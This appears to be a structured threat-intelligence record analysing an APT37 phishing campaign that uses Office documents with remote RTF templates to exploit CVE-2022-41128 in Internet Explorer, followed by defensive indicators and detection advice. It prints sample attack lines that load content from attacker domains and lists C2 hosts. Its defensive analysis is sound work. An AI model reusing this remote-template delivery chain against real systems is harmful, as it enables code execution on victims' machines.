package_info.package_name: APT37 CVE-2022-41128 Malicious Office Document Campaign
package_info.package_manager: Malicious Microsoft Office Documents (malware delivery via Office/RTF/HTML)
package_info.package_versions: N/A (malicious documents, not a software package)
package_info.why_malicious: The documents are weaponized to exploit CVE-2022-41128 in Internet Explorer's JavaScript engine via remote RTF templates, leading to arbitrary code execution, C2 communication, and anti-forensics actions. The entire delivery chain is designed for exploitation and post-exploitation activity.

malicious_snippets.code_snippet:
Remote template injection: The Office document contains a reference to a remote RTF template, e.g.,

<o:OLEObject Type="Embed" ProgID="Word.Document" ShapeID="_x0000_i1025" DrawAspect="Content" ObjectID="..." r:id="rId1"/>

where rId1 points to a remote RTF file (e.g., http://word-template[.]net/template.rtf).
malicious_snippets.code_behavior: When the user opens the document and disables protected view, the Office application fetches a remote RTF template over HTTP, causing the client to download and render attacker-controlled content.

malice_analysis.why_suspicious: Legitimate Office documents rarely require remote RTF templates, especially from untrusted domains. This is a common malware delivery technique.
malice_analysis.violated_expectations: Normal Office documents embed all required content or use trusted sources for templates. Here, the document fetches code from an attacker-controlled server.
malice_analysis.similar_legitimate_use: Corporate templates hosted on internal, trusted servers.
key_indicators: Remote template reference to untrusted domain
Triggering download of additional content upon document open

execution_context.file_location: Remote RTF template (downloaded from attacker server)

malicious_snippets.code_snippet:
RTF template contains an embedded HTML object that loads remote HTML content, e.g.,

{\object\objocx ... <html><script src="http://openxmlformat[.]org/exploit.html"></script></html> ... }
malicious_snippets.code_behavior: When the RTF template is loaded, it causes Internet Explorer to render attacker-controlled HTML/JavaScript, which exploits CVE-2022-41128 in jscript9.dll to achieve arbitrary code execution.

malice_analysis.why_suspicious: Embedding HTML/JavaScript in RTF templates is a known exploitation vector. The use of a known exploit (CVE-2022-41128) is highly suspicious.
malice_analysis.violated_expectations: RTF templates should not contain active HTML/JavaScript objects, especially those loaded from untrusted domains.
malice_analysis.similar_legitimate_use: Rare; almost never legitimate in business workflows.

execution_context.file_location: Shellcode delivered via exploit (injected into process memory)

malicious_snippets.code_behavior: After successful exploitation, the shellcode resolves Windows APIs using a custom hashing algorithm, reports to the C2 server before and after execution, clears Internet Explorer cache and history (anti-forensics), and downloads the next stage payload.

malice_analysis.why_suspicious: Custom API resolution, C2 communication, anti-forensics, and staged payload download are all hallmarks of advanced malware.
malice_analysis.violated_expectations: Normal code does not erase browser history or communicate with C2 servers in this context.
malice_analysis.similar_legitimate_use: Custom API resolution is sometimes used in packers or DRM, but not in Office document context.

attack_chain.action: User opens malicious Office document, which references a remote RTF template.
attack_chain.leads_to: Download and execution of remote RTF template.

attack_chain.action: Office downloads and loads the remote RTF template, which contains embedded HTML/JavaScript.
attack_chain.leads_to: Triggering of Internet Explorer to render attacker-controlled HTML/JavaScript.

attack_chain.action: Internet Explorer processes the malicious HTML/JavaScript, exploiting CVE-2022-41128 to execute shellcode.
attack_chain.leads_to: Arbitrary code execution (shellcode runs in victim context).

attack_chain.action: Shellcode resolves APIs, communicates with C2, clears forensic artifacts, and downloads next stage payload.
attack_chain.leads_to: Establishment of persistence or further post-exploitation (final goal).

behavioral_signatures: Office documents referencing remote RTF templates from untrusted domains
RTF templates with embedded HTML/JavaScript objects
Internet Explorer process spawned by Office applications
Shellcode clearing browser cache/history and communicating with C2
file_indicators: Office documents with remote template references
Unusual process tree: Office -> IE -> shellcode
network_indicators: Connections to word-template[.]net, openxmlformat[.]org, ms-office[.]services, ms-offices[.]com, template-openxml[.]com
C2 communication before and after shellcode execution
detection_knowledge.how_to_detect: Monitor for Office documents that reference remote templates, especially from suspicious domains. Flag RTF files with embedded HTML/JavaScript. Detect Office processes spawning Internet Explorer unexpectedly. Look for process memory indicators of custom API resolution and anti-forensics (cache/history clearing). Monitor outbound connections to known C2 domains and unusual Office/IE network activity.
